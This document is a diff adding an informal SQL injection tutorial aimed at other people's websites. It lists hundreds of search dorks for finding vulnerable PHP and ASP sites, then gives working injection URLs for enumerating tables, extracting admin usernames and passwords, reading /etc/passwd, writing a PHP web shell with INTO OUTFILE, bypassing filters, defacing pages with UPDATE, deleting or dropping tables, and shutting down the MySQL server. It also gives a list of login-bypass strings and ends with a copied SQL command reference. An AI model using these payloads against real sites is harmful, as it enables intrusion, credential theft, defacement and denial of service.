@@ -1,0 +1,1048 @@
+MY SQL TUT
+
+
+Step - 1 )  Finding (maybe)vulnerable site (Dorks)
+
+
+inurl:trainers.php?id=
+inurl:buy.php?category=
+inurl:article.php?ID=
+inurl:play_old.php?id=
+inurl:declaration_more.php?decl_id=
+inurl:pageid=
+inurl:games.php?id=
+inurl:page.php?file=
+inurl:newsDetail.php?id=
+inurl:gallery.php?id=
+inurl:article.php?id=
+inurl:show.php?id=
+inurl:staff_id=
+inurl:newsitem.php?num=
+inurl:readnews.php?id=
+inurl:top10.php?cat=
+inurl:historialeer.php?num=
+inurl:reagir.php?num=
+inurl:Stray-Questions-View.php?num=
+inurl:forum_bds.php?num=
+inurl:game.php?id=
+inurl:view_product.php?id=
+inurl:newsone.php?id=
+inurl:sw_comment.php?id=
+inurl:news.php?id=
+inurl:avd_start.php?avd=
+inurl:event.php?id=
+inurl:product-item.php?id=
+inurl:sql.php?id=
+inurl:news_view.php?id=
+inurl:select_biblio.php?id=
+inurl:humor.php?id=
+inurl:aboutbook.php?id=
+inurl:ogl_inet.php?ogl_id=
+inurl:fiche_spectacle.php?id=
+inurl:communique_detail.php?id=
+inurl:sem.php3?id=
+inurl:kategorie.php4?id=
+inurl:news.php?id=
+inurl:index.php?id=
+inurl:faq2.php?id=
+inurl:show_an.php?id=
+inurl:preview.php?id=
+inurl:loadpsb.php?id=
+inurl:opinions.php?id=
+inurl:spr.php?id=
+inurl:pages.php?id=
+inurl:announce.php?id=
+inurl:clanek.php4?id=
+inurl:participant.php?id=
+inurl:download.php?id=
+inurl:main.php?id=
+inurl:review.php?id=
+inurl:chappies.php?id=
+inurl:read.php?id=
+inurl:prod_detail.php?id=
+inurl:viewphoto.php?id=
+inurl:article.php?id=
+inurl:person.php?id=
+inurl:productinfo.php?id=
+inurl:showimg.php?id=
+inurl:view.php?id=
+inurl:website.php?id=
+inurl:hosting_info.php?id=
+inurl:gallery.php?id=
+inurl:rub.php?idr=
+inurl:view_faq.php?id=
+inurl:artikelinfo.php?id=
+inurl:detail.php?ID=
+inurl:index.php?=
+inurl:profile_view.php?id=
+inurl:category.php?id=
+inurl:publications.php?id=
+inurl:fellows.php?id=
+inurl:downloads_info.php?id=
+inurl:prod_info.php?id=
+inurl:shop.php?do=part&id=
+inurl:productinfo.php?id=
+inurl:collectionitem.php?id=
+inurl:band_info.php?id=
+inurl:product.php?id=
+inurl:releases.php?id=
+inurl:ray.php?id=
+inurl:produit.php?id=
+inurl:pop.php?id=
+inurl:shopping.php?id=
+inurl:productdetail.php?id=
+inurl:post.php?id=
+inurl:viewshowdetail.php?id=
+inurl:clubpage.php?id=
+inurl:memberInfo.php?id=
+inurl:section.php?id=
+inurl:theme.php?id=
+inurl:page.php?id=
+inurl:shredder-categories.php?id=
+inurl:tradeCategory.php?id=
+inurl:product_ranges_view.php?ID=
+inurl:shop_category.php?id=
+inurl:transcript.php?id=
+inurl:channel_id=
+inurl:item_id=
+inurl:newsid=
+inurl:trainers.php?id=
+inurl:news-full.php?id=
+inurl:news_display.php?getid=
+inurl:index2.php?option=
+inurl:readnews.php?id=
+inurl:top10.php?cat=
+inurl:newsone.php?id=
+inurl:event.php?id=
+inurl:product-item.php?id=
+inurl:sql.php?id=
+inurl:aboutbook.php?id=
+inurl:preview.php?id=
+inurl:loadpsb.php?id=
+inurl:pages.php?id=
+inurl:material.php?id=
+inurl:clanek.php4?id=
+inurl:announce.php?id=
+inurl:chappies.php?id=
+inurl:read.php?id=
+inurl:viewapp.php?id=
+inurl:viewphoto.php?id=
+inurl:rub.php?idr=
+inurl:galeri_info.php?l=
+inurl:review.php?id=
+inurl:iniziativa.php?in=
+inurl:curriculum.php?id=
+inurl:labels.php?id=
+inurl:story.php?id=
+inurl:look.php?ID=
+inurl:newsone.php?id=
+inurl:aboutbook.php?id=
+inurl:material.php?id=
+inurl:opinions.php?id=
+inurl:announce.php?id=
+inurl:rub.php?idr=
+inurl:galeri_info.php?l=
+inurl:tekst.php?idt=
+inurl:newscat.php?id=
+inurl:newsticker_info.php?idn=
+inurl:rubrika.php?idr=
+inurl:rubp.php?idr=
+inurl:offer.php?idf=
+inurl:art.php?idm=
+inurl:title.php?id=
+buy.php?category=
+article.php?ID=
+play_old.php?id=
+declaration_more.php?decl_id=
+Pageid=
+games.php?id=
+page.php?file=
+newsDetail.php?id=
+gallery.php?id=
+article.php?id=
+play_old.php?id=
+show.php?id=
+staff_id=
+newsitem.php?num=
+readnews.php?id=
+top10.php?cat=
+historialeer.php?num=
+reagir.php?num=
+forum_bds.php?num=
+game.php?id=
+view_product.php?id=
+newsone.php?id=
+sw_comment.php?id=
+news.php?id=
+avd_start.php?avd=
+event.php?id=
+product-item.php?id=
+sql.php?id=
+news_view.php?id=
+select_biblio.php?id=
+humor.php?id=
+aboutbook.php?id=
+fiche_spectacle.php?id=
+communique_detail.php?id=
+sem.php3?id=
+kategorie.php4?id=
+faq2.php?id=
+show_an.php?id=
+preview.php?id=
+loadpsb.php?id=
+opinions.php?id=
+spr.php?id=
+pages.php?id=
+announce.php?id=
+clanek.php4?id=
+participant.php?id=
+download.php?id=
+main.php?id=
+review.php?id=
+chappies.php?id=
+read.php?id=
+prod_detail.php?id=
+viewphoto.php?id=
+article.php?id=
+play_old.php?id=
+declaration_more.php?decl_id=
+category.php?id=
+publications.php?id=
+fellows.php?id=
+downloads_info.php?id=
+prod_info.php?id=
+shop.php?do=part&id=
+Productinfo.php?id=
+website.php?id=
+Productinfo.php?id=
+showimg.php?id=
+view.php?id=
+rub.php?idr=
+view_faq.php?id=
+artikelinfo.php?id=
+detail.php?ID=
+collectionitem.php?id=
+band_info.php?id=
+product.php?id=
+releases.php?id=
+ray.php?id=
+produit.php?id=
+pop.php?id=
+shopping.php?id=
+productdetail.php?id=
+post.php?id=
+viewshowdetail.php?id=
+clubpage.php?id=
+memberInfo.php?id=
+section.php?id=
+theme.php?id=
+page.php?id=
+shredder-categories.php?id=
+tradeCategory.php?id=
+shop_category.php?id=
+transcript.php?id=
+channel_id=
+item_id=
+newsid=
+trainers.php?id=
+buy.php?category=
+article.php?ID=
+play_old.php?id=
+iniziativa.php?in=
+detail_new.php?id=
+tekst.php?idt=
+newscat.php?id=
+newsticker_info.php?idn=
+rubrika.php?idr=
+rubp.php?idr=
+offer.php?idf=
+hotel.php?id=
+art.php?idm=
+title.php?id=
+look.php?ID=
+story.php?id=
+labels.php?id=
+review.php?id=
+chappies.php?id=
+news-full.php?id=
+news_display.php?getid=
+index2.php?option=
+ages.php?id=
+"id=" & intext:"Warning: mysql_fetch_assoc()
+"id=" & intext:"Warning: mysql_fetch_array()
+"id=" & intext:"Warning: mysql_num_rows()
+"id=" & intext:"Warning: session_start()
+"id=" & intext:"Warning: getimagesize()
+"id=" & intext:"Warning: Unknown()
+"id=" & intext:"Warning: pg_exec()
+"id=" & intext:"Warning: array_merge()
+"id=" & intext:"Warning: mysql_result()
+"id=" & intext:"Warning: mysql_num_rows()
+"id=" & intext:"Warning: mysql_query()
+"id=" & intext:"Warning: filesize()
+"id=" & intext:"Warning: require()
+
+
+***********************************************************************************************************
+Assume site found =   http://www.xxxxx.com/index.php?catid=1
+************************************************************************************************************
+Step -2 Testing if vulnerable
+
+
+Method 1 )  test with this 
+ 
+ http://www.xxxxx.com/index.php?catid=1'    (should retrun error page)
+ http://www.xxxxx.com/index.php?catid='1    (should retrun error page)
+ 
+ Method2 )  Test with this 
+ 
+ http://ww.xxxxx.com/index.php?page=2-1
+ 
+ NOTE: if above both gives same error page then target is mostly vulnerable
+ 
+ In the case where you are to find a website such as this:
+
+Code:
+http://www.site.com/buy.php?id=1&dog;catid=2
+
+Then you must use the same technique with adding a ' except it must be between the value (in this case the number) and the operator (the "=" sign) so it looks like this:
+
+Code:
+http://www.site.com/buy.php?id='1&dog;catid='2
+ 
+ Magic Quotes prevents quotes from being used in injections by either making the ' (original quote) to \' (backslashed quote) or '' (double quote).
+ 
+http://site.com/script.php?id=1 or 1=1 /*
+ 
+ http://site.com/script.php?id=1  or '1'='1' --
+ 
+ http://site.com/script.php?id=1'  or 1=1 --
+ 
+ ubsection 2.3 - Step 2)Check for magic quotes
+
+We know from our example before that magic quotes are off because we used ' to end the WHERE clause and it gave no error, but lets pretend our first try worked, http://site.com/script.php?id=1 or 1=1 --, so were not sure if ?€? causes an error or not. We need to know if magic quotes is on because if we want to use a function like load_file to steal files (discussed later), or choose data where the user = 'admin', we need to be able to use 's, so magic quotes MUST be off.
+
+To find out if theyre on, we would try:
+
+http://site.com/script.php?id=1 or '1'='1' --
+
+If you get an error like:
+
+"Error in MySQL Syntax by '\'1\'=\'1\''. in script.php on line 7."
+
+or
+
+"Error in MySQL Syntax by '''1''=''1'''. in script.php on line 7."
+
+then you would see that magic quotes are on since its adding \s or an extra ' to the ' you put in. Then you would not be able to steal files if load_file was enabled or choose certain data using WHERE ( there is a way to get around it which I will discuss later, but it doesnt work for load_file, just WHERE and other functions discussed later like concat)
+
+Now if you get no error, you know magic_quotes are off and you have an even bigger advantage. That was easy, wasn?€?t it? Now lets move on.
+
+ ************************************************************************************************************
+ Getting Number of Columns
+ 
+ Method 1)
+http://www.example.com/index.php?id=3 ORDER BY (number)--
+				OR
+http://www.tartanarmy.com/news/news.php?id=130 order by 3
+
+where 'number' goes from 1 to the num when u get error page
+
+
+
+http://www.example.com/index.php?id=3 order by 1--  
+http://www.example.com/index.php?id=3 order by 2--
+http://www.example.com/index.php?id=3 order by 3--
+http://www.example.com/index.php?id=3 order by 4--
+http://www.example.com/index.php?id=3 order by 5--
+http://www.example.com/index.php?id=3 order by 6--
+http://www.example.com/index.php?id=3 order by 7--
+http://www.example.com/index.php?id=3 order by 8--
+
+Lets say on order by 8-- you get an error page. This means that the website has 7 columns because
+it will give you errors on anything over 7. 
+
+************************************************************************************************************
+Finding Acsessable Columns
+
+http://www.example.com/index.php?id=-3+UNION+SELECT+1,2,3,4,5,6,7--
+							OR
+http://www.example.com/index.php?id=3+UNION+SELECT+1,2,3,4,5,6,7--
+							OR
+http://www.example.com/index.php?id=-3 UNION SELECT 1,2,3,4,5,6,7--
+							OR
+ http://www.example.com/index.php?id=-3 UNION SELECT 1,2,3,4,5,6,7 /* 
+							OR
+ http://www.site.com/news.php?id=5  union all select 1,2,3/*
+							OR
+http://www.site.ru/index.php?page=-1 union + + + select null, null / *   (where nmber of "nulls' are num of columns" )
+							OR
+http://www.site.ru/index.php?page=99999 union + + + select null, null / *
+							OR
+http://www.so-and-so.com/gallery.php?id=-170  /*union*/ /*all*/ /*select*/ 1,2,3,4,5,6,7,8,9,10--
+							
+where 7 is the lsat column we found in above process.
+with these we will see a fucked up page with ome numbers written on it like 2,3 ...2,5  whatver.these are column we can modify and extract data from
+
+
+
+************************************************************************************************************
+Finding MySQL Database Version
+
+on the column we found exploitable in above will be replaced by @@version  or  version() 
+
+http://www.example.com/index.php?id=-3+UNION+SELECT+@@version,2,3,4,5,6,7--
+
+http://www.site.com/buy.php?id=-1 UNION SELECT 1,unhex(hex(@@version)),3,4--
+
+if we get <5 then we wil have to guess tablename and column , if >5 we can get it easily 
+
+if you get an error "union + illegal mix of collations (IMPLICIT + COERCIBLE) ..."
+then what we need is convert() function
+
+http://www.site.com/news.php?id=5 union all select 1,convert(@@version using latin1),3/*
+
+or with hex() and unhex()
+
+http://www.site.com/news.php?id=5 union all select 1,unhex(hex(@@version)),3/*
+
+http://site.com/script.php?id=1'  and substr(@@version,1)>3 --
+************************************************************************************************************
+Finding Database Names
+
+http://www.example.com/index.php?id=-3+UNION+SELECT+group_concat(schema_name),2,3,4,5,6,7+ from+information_schema.schemata--
+
+http://www.example.com/index.php?id=-3+UNION+SELECT+concat(database()),2,3,4,5,6,7--
+
+
+************************************************************************************************************
+TIP-  we can also find version ,  database  by :-
+where test is assume table name. if then we get error msg with database name
+
+
+http://www.example.com/index.php?id=-3+UNION+SELECT+version,database(),3,4,5,6,7 FROM TEST--
+
+http://www.site.ru/index.php?page=-1 + union + +1.2 select, USER (), 4,5,6 / *
+
+http://www.site.ru/index.php?page=-1 + union + +1.2 select, VERSION (), 4,5,6 / *
+
+http://www.site.ru/index.php?page=-1 + union + +1.2 select, DATABASE (), 4,5,6 / *
+
+
+http://www.site.ru/index.php?page=-1 + union + +1.2 select, user, password, 5,6 mysql.user + from + / *
+
+http://www.site.ru/index.php?page=-1+ union + +1.2 select, name, passwd, 4,5,6 + + from users / *
+************************************************************************************************************
+Finding Table Names
+
+
+
+for version >5
+http://www.example.com/index.php?id=-3 union select group_concat(table_name),2,3,4,5,6,7 from information_schema.tables where table_schema=database()--
+											OR
+http://www.site.com/news.php?id=5  union all select 1,table_name,3 from information_schema.tables/*
+
+ Now we must add LIMIT to the end of query to list out all tables.
+
+http://www.site.com/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 0,1/*
+
+note that i put 0,1 (get 1 result starting from the 0th)
+
+now to view the second table, we change limit 0,1 to limit 1,1
+
+http://www.site.com/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 1,1/*
+
+the second table is displayed.
+
+http://www.site.com/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 2,1/*
+
+See where it says tar_admin? Thats what we want. But how are we gonna get the info thats in there? Like this. *If you downloaded the hackbar, like I told you to, your gonna need it*
+Code:
+
+http://www.site.com/buy.php?id=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name="Admin"--
+
+http://www.tartanarmy.com/news/news.php?id=-130 UNION SELECT 1,2,3,4,group_concat(column_name),6  from information_schema.columns where table_name= tar_admin
+So, tar_admin is what we want to get into, but putting it just like that wont work. We need too convert it into CHAR (). The HackBar can do that. Highlight what you want to turn into CHAR () and click MySQL, then MYSQL CHAR ().
+Code:
+tar_admin = CHAR(116, 97, 114, 95, 97, 100, 109, 105, 110)
+
+So the whole thing is :
+Code:
+http://www.tartanarmy.com/news/news.php?id=-130 UNION SELECT 1,2,3,4,group_concat(column_name),6  from information_schema.columns where table_name= CHAR(116, 97, 114, 95, 97, 100, 109, 105, 110)
+
+********************************
+for version < 5 we have to guess table name 
+common table names are: user/s, admin/s, member/s ...
+
+http://www.site.com/news.php?id=5  union all select 1,2,3 from admin/* 
+
+(we see number 2 on the screen like before, and that's good :D) we know that table admin exists...
+
+
+************************************************************************************************************
+Finding Column Names
+
+for version > 5
+
+http://www.example.com/index.php?id=-3 union select group_concat(column_name),2,3,4,5,6,7 from information_schema.columns where table_schema=database()--
+											OR
+http://www.site.com/news.php?id=5  union all select 1,column_name,3 from information_schema.columns limit 0,1/*						
+http://www.site.com/news.php?id=5  union all select 1,column_name,3 from information_schema.columns limit 1,1/*
+
+sqlivulnerablesite.com/index.php?id=1 union all select 1,column_name,3,4,5,6,7,8,9 from information_schema.columns where table_name=char(x)--
+
+http://www.tartanarmy.com/news/news.php?id=-130 UNION SELECT 1,2,3,4,group_concat(column_name),6  from information_schema.columns where table_name= tar_admin
+
+http://www.site.com/buy.php?id=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name=0x41646d696e--
+
+So, tar_admin is what we want to get into, but putting it just like that wont work. We need too convert it into CHAR (). The HackBar can do that. Highlight what you want to turn into CHAR () and click MySQL, then MYSQL CHAR ().
+Code:
+tar_admin = CHAR(116, 97, 114, 95, 97, 100, 109, 105, 110)
+
+So the whole thing is :
+Code:
+http://www.tartanarmy.com/news/news.php?id=-130 UNION SELECT 1,2,3,4,group_concat(column_name),6  from information_schema.columns where table_name= CHAR(116, 97, 114, 95, 97, 100, 109, 105, 110)
+
+*****************************************
+for version < 5
+
+common column names are: username, user, usr, user_name, password, pass, passwd, pwd etc...
+
+
+http://www.site.com/news.php?id=5 union all select 1,username,3 from admin/* (if you get an error, then try the other column name)
+
+we get username displayed on screen, example would be admin, or superadmin etc...
+
+now to check if column password exists
+
+http://www.site.com/news.php?id=5 union all select 1,password,3 from admin/* (if you get an error, then try the other column name)
+
+we seen password on the screen in hash or plain-text, it depends of how the database is set up :)
+
+when you have this, you can login like admin or some superuser :D
+
+************************************************************************************************************
+TIP: 
+
+if can't guess the right table name, you can always try mysql.user (default)
+
+it has user i password columns, so example would be
+
+http://www.site.com/news.php?id=5 union all select 1,concat(user,0x3a,password),3 from mysql.user/*
+*****************************************
+
+if you wanna display column names for specific table use this query. (where clause)
+let's say that we found table users.
+
+http://www.site.com/news.php?id=5  union all select 1,column_name,3 from information_schema.columns where table_name='users'/*
+
+Note that this won't work if the magic quotes is ON.
+
+let's say that we found colums user, pass and email.
+
+now to complete query to put them all together :D
+
+for that we use concat() , i decribe it earlier.
+
+http://www.site.com/news.php?id=5 union all select 1,concat(user,0x3a,pass,0x3a,email) from users/*
+
+************************************************************************************************************
+pull information
+
+http://www.example.com/index.php?id=-3 union select 1,group_concat(Columnname,0x3a,columnname,0x3a),2,3,4,5,6,7 from databasename.tablename--
+
+
+EX:  http://www.example.com/index.php?id=-3 union select 1,group_concat(admin_username,0x3a,admin_password,0x3a),2,3,4,5,6,7 from whippit.t_admin--
+
+ 
+ 
+ 
+http://www.site.com/news.php?id=5 union all select 1,concat(username,0x3a,password),3 from admin/*
+
+Note that i put 0x3a, its hex value for : (so 0x3a is hex value for colon)
+
+(there is another way for that, char(58), ascii value for : )
+ 
+ 
+ sqlivulnerablesite.com/index.php?id=1 union all select 1,concat(username),0x3a,(password),3,4,5,6,7,8,9 from --
+ **************************************************************************************************************************************************
+ 
+3) Read files on the server
+If we have the right file_priv we can read the files on the server
+check with the user to visualize which mysqld. To do so, we will help LOAD_FILE () function. Example:
+
+
+Code:
+
+http://www.site.ru/index.php?page=-1 + union + +1.2 select, LOAD_FILE ( '/ etc / passwd'), 4,5,6 / *
+
+4) Get a shell
+Immediately I say that for this we need to know the location checked-out site. Drawing up a request to file recordable shell. Let mouth. dirrektoriya "/ home / site / public_html /"
+Then, a query is:
+
+
+Code:
+
+http://www.site.ru/index.php?page=-1 + union + select +1,2,3,4,5, '<? php system ($ _GET [cmd]);>' + + + from mysql.user into outfile + + '/ home / site / public_html / shell.php' / *
+
+Here, indeed all of the major steps that can be done with MySQL Inj. All that I can add more, so that, for example, can be controlled number of outgoing HELPED table with the command limit.
+Syntax: limit shift, QTY
+Exapmle: union select 1.2, user, pass, from 5,6 + + + users limit +5.3 / * [/ i]
+As a result which will return to 3 entry, beginning with the fifth
+
+
+Secrets and the nuances
+filtering Workaround:
+For example, I sometimes met with the fact that variable with mysql inj filtered so that the expression, in the name field, I can not use the letters. This, I bypassed this way:
+
+
+
+Code:
+
+http://www.site.ru/index.php?page=-1 + union + +1.2 select, AES_DECRYPT (AES_ENCRYPT (USER (), 0x71), 0x71), 4,5,6 / *
+
+It worked successfully.
+
+
+
+http://www.site.ru/index.php?page=-1 + union + +1.2 select, LOAD_FILE (char (47101116,99,47112,97115115119100)), 4,5,6 / *
+
+
+http://www.site.ru/index.php?page=-1 + union + +1.2 select, user, password, 5,6 mysql.user + from + / * 
+
+http://www.site.ru/index.php?page=-1/ ** / union / ** / select / ** / 1.2, user, password, 5.6 / ** / from / * * / mysql.user / *
+
+
+
+DOS
+
+http://www.site.ru/index.php?page=-1 + BENCHMARK (10000000, BENCHMARK (10000000 md
+
+other way 
+
+http://www.xxxx.com/index.php?catid=1  union select 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()),3,4--
+http://www.xxxx.com/index.php?catid=-1  UNION SELECT 1,concat(table_name,CHAR(58),column_name,CHAR(58),table_schema) from information_schema.columns where column_name like CHAR(37, 112, 97, 115, 37),3,4--
+
+http://www.xxxx.com/index.php?catid=1  UNION SELECT 1,password,3,4 FROM admintablename--
+
+where it says admintablename type the table you found with concat(table_name,CHAR(58),column_name,CHAR(58),table_schema) from information_schema.columns where column_name like CHAR(37, 112, 97, 115, 37)-- or your guess
+then once u have the right table name you should get the administrator password
+then just do the same thing but type username instead of password
+sometimes the password is hashed and you need to crack it.
+then see if you can get the admin panel if you cant then try the admin panel finder script here http://www.darkc0de.com/c0de/perl/admin_1.2_.txt
+now if the database is version 5 or up
+type
+http://www.xxxx.com/index.php?catid=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables--
+and that will display a list of all the tables
+once you have your table name
+type the same thing as 4
+http://www.xxxx.com/index.php?catid=1 UNION SELECT 1,password,3,4 FROM admintable--
+then the same with username
+ **********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
+ 
+ 
+ Tut 2
+ 
+ AT very weak site 
+ 
+ with admin pages 
+ 
+ "inurl:admin.asp"
+"inurl:login/admin.asp"
+"inurl:admin/login.asp"
+"inurl:adminlogin.asp"
+"inurl:adminhome.asp"
+"inurl:admin_login.asp"
+"inurl:administratorlogin.asp"
+"inurl:login/administrator.asp"
+"inurl:administrator_login.asp"
+
+so what we do here is in the username we always type "Admin"
+and for our password we type our sql injection
+
+here is a list of sql injections
+
+' or '1'='1
+' or 'x'='x
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 'x'='x
+" or "x"="x
+') or ('x'='x
+' or 1=1--
+" or 1=1--
+or 1=1--
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+'or'1=1'
+ 
+ 
+ ****************************************************************************************************************************
+ example table names
+ 
+ archives,articles,articles2,digest,edition,events,links,nomination,sections,staf ?f,survey
+ 
+ example column name
+ id,date,title,by,abstract,body,section,keywords,photo,id,date,title,author,abstr?act,body,section,keywords,
+photo,caption,caption2,caption3,caption4,lead,id,date,title,author,abstract,body?,section,keywords,photo,
+caption,caption2,caption3,caption4,lead,id,date,title,city,body,id,volume,number?,date,id,title,body,
+month,day,year,date,time,time2,location,cost,contact,phone,email,url,approved,id?,url,title,category,
+description,id,date,nominator,nominatortitle,nominatorcompany,nominatoraddress,n?ominatorcity,
+nominatorstate,nominatorzip,nominatorphone,nominatorfax,nominatoremail,nomineeco?mpany,nomineeaddress,
+nomineecity,nomineestate,nomineezip,nomineephone,nomineefax,nomineeweb,reason,re?asonother,sat1,sat2,sat3,
+sat4,sat5,ethics1,ethics2,ethics3,ethics4,contrib1,contrib2,contrib3,contrib4,de?v1,dev2,dev3,dev4,dev5,
+dev6,dev7,dev8,dev9,lead1,lead2,lead3,lead4,lead5,lead6,quality1,quality2,contac?t1name,contact1title,
+contact1phone,contact1email,contact2name,contact2title,contact2phone,contact2ema?il,contact3name,
+contact3title,username, user, usr, user_name, password, pass, passwd, pwd
+ 
+ ****************************************************************************************************************************
+  
+ ****************************************************************************************************************************
+ 
+
+  ********************************************************
+
+ 
+ CTD...
+MODIFYING SITE CONTENT:
+Sometime, u find the vulnerable site and get evrything to know but maybe admin login doesn't exist or it is accessible for certain IP range. Even in that context, u can use some kewl SQL commands for modifying the site content. I haven't seen much articles addressing this one so thought to include it here.
+Here, I will basically talk about few SQL commands u may use to change the site content. Therse commands are the workhorse of MySQL & are deadly when executed.
+First let me list these commands:
+UPDATE: It is used to edit infos already in the db without deleting any rows.
+DELETE: It is used to delete the contents of one or more fields.
+DROP: It is used completely delete a table & all its associated data.
+Now, u could have figured out that these commands can be very desctructive if the site lets us to interact with db with no sanitization & proper permission.
+Command Usage:
+UPDATE: Our vulnerable page is:
+http://www.site.com/article.php?id=5
+Lets say the query is:
+SELECT title,data,author FROM article WHERE id=5
+Though in reality, we don't know the query as above, we can find the table and column name as discussed earlier.
+So we would do:
+www.site.com/article.php?id=5 UPDATE article SET title='Hacked By PinningYou'/*
+or, u could alternatively do:
+www.site.com/article.php?id=5 UPDATE article SET title='HACKED BY PinningYou',data='Ur site has zero
+security',author='sam207'/*
+
+By executing first query, we have set the title value as 'Hacked By sam207' in the table article while in second query, we have updated all three fields title, data, & author in the table article.
+Sometimes, u may want to change the specific page with id=5. For this u will do:
+www.site.com/article.php?id=5 UPDATE article SET title='value 1',data='value 2',author='value 3' WHERE id=5/*
+
+DELETE:As already stated, this deletes the content of one or more fields permanently from the db server.
+The syntax is:
+www.site.com/article.php?id=5 DELETE title,data,author FROM article/*
+or if u want to delete these fields from the id=5, u will do:
+www.site.com/article.php?id=5 DELETE title,data,author FROM article WHERE id=5/*
+
+DROP:This is another deadly command u can use. With this, u can delete a table & all its associated data.
+For this, we make our URL as:
+www.site.com/article.php?id=5 DROP TABLE article/*
+This would delete table article & all its contents.
+
+Finally, I want to say little about ;
+Though I have not used this in my tutorial, u can use it to end ur first query and start another one.
+This ; can be kept at the end of our first query so that we can start new query after it.
+CTD...
+SHUTTING DOWN MySQL SERVER:
+This is like DoSing the server as it will make the MySQL resources unavailable for the legitimate users or site visitors... For this, you will be using: SHUTDOWN WITH NOWAIT;
+So, you would craft a query which would execute the above command...
+For example, in my case, I would do the following:
+www.site.com/article.php?id=5 SHUTDOWN WITH NOWAIT;
+WOW! the MySQL server is down... This would prevent legitimate users & site visitors from using or viewing MySQL resources...
+
+LOADFILE:
+MySQL has a function called load_file which you can use for your benefits again.. I have not seen much site where I could use this function... I think we should have MySQL root privilege for this.... Also, the magic quotes should be off for this.. But there is a way to get past the magic quotes... load_file can be used to load certain files of the server such as .htaccess, .htpasswd, etc.. & also password files like etc/passwd, etc..
+Do something like below:
+www.site.com/article.php?id=5 UNION ALL SELECT load_file('etc/passwd'),2/*
+
+But sometimes, you will have to hex the part & do something like below:
+www.site.com/article.php?id=5 UNION ALL SELECT load_file(0x272F6574632F70617373776427)
+where I have hexed... Now, if we are lucky, the scriptblock would echo the etc/passwd in the result..
+
+MySQL ROOT:
+If the MySQL version is 5 or above, we might be able to gain MySQL root privilege which will again be helpful for us.. MySQL servers from version 5 have a table called mysql.user which contains the hashes & usernames for login... It is in the user table of the mysql database which ships with every installation of MySQL..
+For this, you will do:
+www.site.com/article.php?id=5 UNION ALL SELECT concat(username,0x3a,password),2 from mysql.user/*
+
+Now you will get the usernames & hashes.. The hash is mysqlsha1... Quick note: JTR won't crack it.. But http://www.insidepro.com has one to do it..
+CTD...
+FINALIZING THE INJECTION TUTORIAL:
+I know I have missed some things like outfile, WHERE clause, blind injection,etc... If I get time, I would try to update the tutorial with these.. Also for all sql injectors, think in a broad way.. & hexing is an important part in sql injection.. Sometimes the things that can't be done with normal ways can be done by using the hex part.. & be sure to try things with char(), hex() functions.. With these, you can bypass magic quotes on the server.. Again, within the UNION statement, you may try to use the XSS which would be sometimes helpful for you..
+www.site.com/article.php?id=5 UNION ALL SELECT <scblockedript>alert("XSS via SQL injection");</scblockedript>,2/*
+Again in the above injection, you may require to hex up the javascriptblock part for bypassing the magic quotes..
+Also for starters & those who know little things, you may setup a MySQL server & configure PHP for your apache server in your localhost where you can try different things..
+In the command line interface of MySQL, try various commands enlisted below.. Try by modifying them... This would help you improve your MySQL command knowledge.. Also try to see how PHP codes interact with MySQL server.. For example, install some free forums like PHPBB, SMF,etc.. or some content management system as it would help you in two ways.. First, you would learn how the PHP interacts with MySQL.. You may check MySQL folder with what changes has occured after installing them.. What would happen if I do this? or that?? etc..etc.. Second, you may be able to find bugs in them.. like rfi in some part of the code or sql injection in another part or maybe csrf injection,etc.. That would help you to learn new things because you all know practice makes the man perfect...
+CTD
+MAJOR MySQL COMMANDS:
+Below, I would list some major MySQL commands that might help you a lot... Play with them in different ways by setting up a MySQL server in your computer..
+All the commands here are copy pasted from the post at http://www.h4cky0u.org & the credit for this part goes to the original author.. This is the only part which I didn't write myself.. I could have but since there is better one, I thought to put the same part here.. Thanks to whoever posted this in h4cky0u site.. & also full credits to him/her for this part..
+ABORT -- abort the current transaction
+ALTER DATABASE -- change a database
+ALTER GROUP -- add users to a group or remove users from a group
+ALTER TABLE -- change the definition of a table
+ALTER TRIGGER -- change the definition of a trigger
+ALTER USER -- change a database user account
+ANALYZE -- collect statistics about a database
+BEGIN -- start a transaction block
+CHECKPOINT -- force a transaction log checkpoint
+CLOSE -- close a cursor
+CLUSTER -- cluster a table according to an index
+COMMENT -- define or change the comment of an object
+COMMIT -- commit the current transaction
+COPY -- copy data between files and tables
+CREATE AGGREGATE -- define a new aggregate function
+CREATE CAST -- define a user-defined cast
+CREATE CONSTRAINT TRIGGER -- define a new constraint trigger
+CREATE CONVERSION -- define a user-defined conversion
+CREATE DATABASE -- create a new database
+CREATE DOMAIN -- define a new domain
+CREATE FUNCTION -- define a new function
+CREATE GROUP -- define a new user group
+CREATE INDEX -- define a new index
+CREATE LANGUAGE -- define a new procedural language
+CREATE OPERATOR -- define a new operator
+CREATE OPERATOR CLASS -- define a new operator class for indexes
+CREATE RULE -- define a new rewrite rule
+CREATE SCHEMA -- define a new schema
+CREATE SEQUENCE -- define a new sequence generator
+CREATE TABLE -- define a new table
+CREATE TABLE AS -- create a new table from the results of a query
+CREATE TRIGGER -- define a new trigger
+CREATE TYPE -- define a new data type
+CREATE USER -- define a new database user account
+CREATE VIEW -- define a new view
+DEALLOCATE -- remove a prepared query
+DECLARE -- define a cursor
+DELETE -- delete rows of a table
+DROP AGGREGATE -- remove a user-defined aggregate function
+DROP CAST -- remove a user-defined cast
+DROP CONVERSION -- remove a user-defined conversion
+DROP DATABASE -- remove a database
+DROP DOMAIN -- remove a user-defined domain
+DROP FUNCTION -- remove a user-defined function
+DROP GROUP -- remove a user group
+DROP INDEX -- remove an index
+DROP LANGUAGE -- remove a user-defined procedural language
+DROP OPERATOR -- remove a user-defined operator
+DROP OPERATOR CLASS -- remove a user-defined operator class
+DROP RULE -- remove a rewrite rule
+DROP SCHEMA -- remove a schema
+DROP SEQUENCE -- remove a sequence
+DROP TABLE -- remove a table
+DROP TRIGGER -- remove a trigger
